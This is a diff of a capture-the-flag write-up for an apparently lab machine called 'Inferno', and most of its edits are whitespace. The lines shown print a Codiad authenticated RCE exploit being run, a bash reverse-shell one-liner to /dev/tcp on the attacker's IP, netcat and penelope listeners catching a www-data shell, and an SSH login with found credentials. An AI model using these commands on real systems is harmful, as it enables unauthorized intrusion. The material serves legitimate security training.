@@ -373,8 +373,8 @@ It seems we can read the files, but have no write access. From the title, we kno
 Found a authenticated RCE for Codiad. "*https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit*"
 
 ```bash
-kali@kali:python2 codiad.py http://admin:d...1@10.49.186.74/inferno/ admin d...1 192.168.130.26 4444 linux                                                  
-[+] Please execute the following command on your vps: 
+kali@kali:python2 codiad.py http://admin:d...1@10.49.186.74/inferno/ admin d...1 192.168.130.26 4444 linux
+[+] Please execute the following command on your vps:
 echo 'bash -c "bash -i >/dev/tcp/192.168.130.26/4445 0>&1 2>&1"' | nc -lnvp 4444
 nc -lnvp 4445
 [+] Please confirm that you have done the two command above [y/n]
@@ -400,7 +400,7 @@ connect to [192.168.130.26] from (UNKNOWN) [10.49.186.74] 46148
 ```
 
 ```bash
-kali@kali:penelope -p 4445                                                                                                                                    
+kali@kali:penelope -p 4445
 [+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
@@ -408,14 +408,14 @@ kali@kali:penelope -p 4445
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-15_38_18-741.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$
 ```
 
 We have a shell as www-data. 
 
 ```bash
-penelope -p 4445
+kali@kali:penelope -p 4445
 [+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from ip-10-49-186-74~10.49.186.74-Linux-x86_64 😍 Assigned SessionID <1>
@@ -423,7 +423,7 @@ penelope -p 4445
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-15_58_41-139.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ exit
 [-] Session [1] died... We lost ip-10-49-186-74~10.49.186.74-Linux-x86_64 💔
 ```
@@ -442,7 +442,7 @@ kali@kali:penelope -p 4445
 [+] Shell upgraded successfully using /usr/bin/script! 💪
 [+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
 [+] Logging to /home/kali/.penelope/sessions/ip-10-49-186-74~10.49.186.74-Linux-x86_64/2026_02_16-16_02_43-481.log 📜
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ screen
 [screen is terminating]
 www-data@ip-10-49-186-74:/var/www/html/inferno/components/filemanager$ 
@@ -484,7 +484,7 @@ dante:V1...m3
 It has a password of dante at bottom, let;s login via ssh as user dante to get proper tty.
 
 ```bash
-kali@kali:ssh dante@10.49.186.74                                                                                                                              
+kali@kali:ssh dante@10.49.186.74
 The authenticity of host '10.49.186.74 (10.49.186.74)' can't be established.
 ED25519 key fingerprint is: SHA256:PpqiCUrfu7mamLs2uhroTrhbRniyUUd4F46o6V85WzQ
 This key is not known by any other names.
@@ -493,7 +493,7 @@ Warning: Permanently added '10.49.186.74' (ED25519) to the list of known hosts.
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
-dante@10.49.186.74's password: 
+dante@10.49.186.74's password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -501,8 +501,7 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
  * Support:        https://ubuntu.com/pro
 
  System information as of Mon 16 Feb 2026 10:00:10 AM UTC
-
-  System load:  0.0               Processes:             2255
+  System load:  0.0               Processes:2255
   Usage of /:   78.7% of 8.76GB   Users logged in:       0
   Memory usage: 42%               IPv4 address for ens5: 10.49.186.74
   Swap usage:   0%
@@ -525,7 +524,7 @@ To check for new updates run: sudo apt update
 Your Hardware Enablement Stack (HWE) is supported until April 2025.
 
 Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
-dante@ip-10-49-186-74:~$ 
+dante@ip-10-49-186-74:~$
 ```
 
 First flag is at dante's home directory. 
